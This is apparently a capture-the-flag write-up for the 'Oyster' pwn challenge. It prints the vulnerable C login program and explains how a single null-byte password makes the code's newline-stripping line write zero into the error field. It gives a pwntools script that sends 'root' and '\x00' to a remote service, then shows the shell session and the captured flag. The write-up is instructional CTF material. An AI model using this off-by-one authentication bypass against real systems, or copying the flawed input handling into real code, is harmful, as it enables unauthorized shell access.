# Oyster : Pwn

Oyster has a secure shell to store your valuable pearl.

Attachment  
[oyster.tar.gz](oyster.tar.gz)  

Tags : Null Byte Overwrite, Out-Of-Bounds Write  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/random.h>

#define INPUT_SIZE 0x20

/* Credential structure */
typedef struct {
  long err;
  char password[INPUT_SIZE];
  char username[INPUT_SIZE];
} cred_t;

/* Root password */
char password[INPUT_SIZE];

void getstr(const char *s, char *buf, size_t len) {
  /* Get a line of input */
  printf("%s", s);
  if (fgets(buf, len, stdin) == NULL)
    exit(1);

  /* Remove trailing newline */
  buf[strlen(buf)-1] = '\0';
}

int main(void) {
  cred_t cred = { .err = -1 };

  /* Ask username and password */
  getstr("Username: ", cred.username, INPUT_SIZE);
  getstr("Password: ", cred.password, INPUT_SIZE);

  /* Authenticate */
  if (strcmp(cred.username, "root") == 0) {
    if (strcmp(cred.password, password) == 0)
      cred.err = 0;
  } else {
    cred.err = -1;
  }

  if (cred.err < 0) {
    puts("[-] Invalid username or password");
  } else {
    puts("[+] Authenticated");
    system("/bin/sh");
  }

  return 0;
}

__attribute__((constructor))
void setup(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Create secure password */
  if (getrandom(password, sizeof(password), 0) != sizeof(password))
    exit(1);

  for (size_t i = 0; i < 9; i++)
    password[i] = 0x21 + ((unsigned char)password[i] % (0x7e - 0x21));
}
```
This program write null at the index getting from `strlen(buf)-1`.  
Thus, in case that password is set null, `buf[-1]=err` is made `0`.
```
$ checksec oyster
[*] '/home/colza/oyster'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
The apploach is as follows:
* Overwrite err of `cred_t` structure with `0` using out-of-bounds write.

The steps are as follows:
 * set username to `root`
 * set password to `\0`

Execution code below:
```python solve.py
from pwn import *

p = remote("34.170.146.252", 43747)

p.sendlineafter(b"Username: ", b"root")
p.sendlineafter(b"Password: ", b"\x00")

p.interactive()
```
Execute it.
```
$ python3 solve.py
[+] Opening connection to 34.170.146.252 on port 43747: Done
[*] Switching to interactive mode
[+] Authenticated
$ ls
bin
boot
dev
etc
flag-c802e7147e4e52b7218ff2204b67d2ed.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag*
Alpaca{wH4t_5h3L1f1Sh_d0_U_l1K3_7h3_B3s7?}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 43747
[*] Got EOF while sending in interactive
```

Got the flag!

`Alpaca{wH4t_5h3L1f1Sh_d0_U_l1K3_7h3_B3s7?}`
